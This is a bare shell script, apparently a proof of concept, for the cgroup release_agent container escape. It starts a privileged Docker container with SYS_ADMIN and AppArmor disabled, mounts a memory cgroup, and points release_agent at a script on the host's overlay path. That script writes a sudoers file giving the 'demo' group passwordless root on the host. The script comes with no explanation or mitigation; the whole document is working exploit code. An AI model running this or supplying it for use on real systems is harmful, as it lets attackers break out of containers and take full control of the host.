
# docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "echo '%demo ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/demo" >> /cmd
echo "chmod 0400 /etc/sudoers.d/demo" >> /cmd
echo "chown root.root /etc/sudoers.d/demo" >> /cmd
echo "ls -lsa /etc/sudoers.d/ > $host_path/output" >> /cmd
chmod a+x /cmd
 
bash -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"